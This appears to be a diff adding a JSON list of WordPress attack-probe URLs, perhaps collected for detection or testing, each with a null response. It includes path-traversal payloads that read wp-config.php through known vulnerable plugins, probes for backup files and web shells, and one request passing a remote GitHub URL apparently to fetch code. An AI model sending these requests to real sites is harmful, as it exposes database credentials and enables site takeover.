@@ -1,0 +1,278 @@
+[
+  {
+    "url": "/2015/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/2016/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/2017/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/2018/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/2019/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/2020/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/2021/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/blog/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/blog/wp-login.php?",
+    "response": null
+  },
+  {
+    "url": "/cms/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/media/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/news/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/shop/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/site/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/sito/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/test/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/web/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/website/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/wordpress/license.txt?",
+    "response": null
+  },
+  {
+    "url": "/wordpress/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/wordpress/wp-login.php?",
+    "response": null
+  },
+  {
+    "url": "/wordpress/xmlrpc.php?",
+    "response": null
+  },
+  {
+    "url": "/wordpress?",
+    "response": null
+  },
+  {
+    "url": "/wp-1ogin_bak.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php",
+    "response": null
+  },
+  {
+    "url": "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
+    "response": null
+  },
+  {
+    "url": "/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes",
+    "response": null
+  },
+  {
+    "url": "/wp-admin/config.bak.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-admin/install.php?step=1",
+    "response": null
+  },
+  {
+    "url": "/wp-admin/setup-config.php?step=1",
+    "response": null
+  },
+  {
+    "url": "/wp-booking.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-config.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/config.bak.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/db_cache.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/langar.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/mu-plugins/db-safe-mode.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/backup_index.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/config.bak.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/ioptimization/IOptimize.php?rchk",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/t_file_wp/t_file_wp.php?test=hello",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/ubh/up.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/wpconfig.bak.php?act=sf",
+    "response": null
+  },
+  {
+    "url": "/wp-content/plugins/wpdiscuz/themes/default/style-rtl.css?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/themes/config.bak.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php",
+    "response": null
+  },
+  {
+    "url": "/wp-content/wp-1ogin_bak.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-content/wp-old-index.php?action=login&pass=-1&submit=",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/ID3/license.txt?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/config.bak.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/css/css.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/css/wp-config.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/fonts/css.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/lfx.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/small.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/wp-includes/wpconfig.bak.php?act=sf",
+    "response": null
+  },
+  {
+    "url": "/wp-login.php?",
+    "response": null
+  },
+  {
+    "url": "/wp-old?",
+    "response": null
+  },
+  {
+    "url": "/wp/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/wp/wp-login.php?",
+    "response": null
+  },
+  {
+    "url": "/wp/xmlrpc.php?",
+    "response": null
+  },
+  {
+    "url": "/wp1/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/wp2/wp-includes/wlwmanifest.xml?",
+    "response": null
+  },
+  {
+    "url": "/wp?",
+    "response": null
+  },
+  {
+    "url": "/wpindex.php?idb=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1",
+    "response": null
+  }
+]
